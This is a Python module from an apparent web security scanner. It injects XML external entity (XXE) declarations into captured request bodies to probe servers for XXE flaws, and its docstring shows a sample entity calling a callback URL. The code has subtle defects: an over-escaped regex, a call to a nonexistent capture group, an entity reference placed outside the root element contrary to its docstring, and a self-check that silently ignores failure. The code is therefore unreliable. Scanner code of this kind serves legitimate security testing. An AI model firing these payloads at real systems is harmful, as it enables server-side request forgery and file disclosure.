"""XXE-specific replayer that mutates XML document bodies.

Inherits from ``RequestReplayer`` and overrides ``_build_request()``
to inject XML entities into the body instead of URL/JSON parameters.

Implements the ``XMLMutableReplayer`` protocol for runtime type safety.
"""

import logging
import re
from typing import Optional

import httpx

from pwnproxy.shared.scan.params import InjectionPoint
from pwnproxy.shared.scan.replayer import RequestReplayer
from pwnproxy.shared.scan.protocols import XMLMutableReplayer
from pwnproxy.shared.scan.utils import build_request

logger = logging.getLogger(__name__)

# Regex to locate the first XML element start for entity injection
_RE_ELEMENT_START = re.compile(r"<\\w+", re.DOTALL)


class XxeReplayer(RequestReplayer):
    """Replayer that mutates XML bodies for XXE detection.

    Usage::

        replayer = XxeReplayer(flow)
        stage = XxeErrorBasedStage(replayer)
    """

    def _build_request(
        self,
        point: InjectionPoint,
        payload: str,
        evasion_level: str = "none",
    ) -> httpx.Request:
        """Override: inject *payload* as an XXE entity in the XML body.

        If ``point.original_body`` looks like XML, mutates the body via
        ``mutate_xml_body()``. Otherwise falls back to param injection
        (e.g. for JSON endpoints that get converted to XML).
        """
        body = point.original_body or ""
        if self._looks_like_xml(body):
            mutated = self.mutate_xml_body(body, payload)
            # Build request with the mutated body instead of param injection
            return build_request(
                self.flow,
                point,
                mutated,
                override_body=True,
            )
        # Fallback: inject as parameter value (for JSON→XML conversion etc.)
        modified = point.inject(payload, evasion_level=evasion_level)
        return build_request(self.flow, point, modified)

    def mutate_xml_body(self, body: str, payload: str) -> str:
        """Inject *payload* as an external entity definition in *body*.

        Adds a DOCTYPE declaration with an external entity pointing to
        the callback/payload URL, then references the entity inside the
        first XML element.

        Example::

            Input:  <root><data>foo</data></root>
            Output: <!DOCTYPE root [
                      <!ENTITY xxe SYSTEM "http://callback/payload">
                    ]>
                    <root><data>foo</data></root>
                    &xxe;
        """
        # If there's already a DOCTYPE, inject entity there
        doctype_match = re.search(r"<!DOCTYPE\s+\w+", body, re.IGNORECASE)
        if doctype_match:
            # Inject entity inside existing DOCTYPE
            body = re.sub(
                r"(\[)",
                f"\\1\n  <!ENTITY xxe SYSTEM \"{payload}\">",
                body,
                count=1,
            )
        else:
            # Add DOCTYPE before the root element
            match = _RE_ELEMENT_START.search(body)
            if match:
                root_name = match.group(1)
                doctype = (
                    f"<!DOCTYPE {root_name} [\n"
                    f"  <!ENTITY xxe SYSTEM \"{payload}\">\n"
                    f"]>\n"
                )
                body = body[: match.start()] + doctype + body[match.start() :]

        # Add entity reference at the end
        body += "\n&xxe;"
        return body

    @staticmethod
    def _looks_like_xml(body: str) -> bool:
        """Heuristic: does *body* look like XML?"""
        if not body:
            return False
        stripped = body.strip()
        return stripped.startswith("<") and stripped.endswith(">")


# Protocol conformance — verify at import time that XxeReplayer
# satisfies XMLMutableReplayer protocol structurally.
# We instantiate with None flow just for the isinstance check;
# the runtime constructor still expects a real Flow object.
try:
    _probe = XxeReplayer.__new__(XxeReplayer)
    _probe.client = None  # satisfy __init__ assumptions minimally
    assert isinstance(_probe, XMLMutableReplayer), (
        "XxeReplayer must implement XMLMutableReplayer protocol"
    )
    del _probe
except Exception:
    pass  # safe to ignore — the isinstance check is best-effort here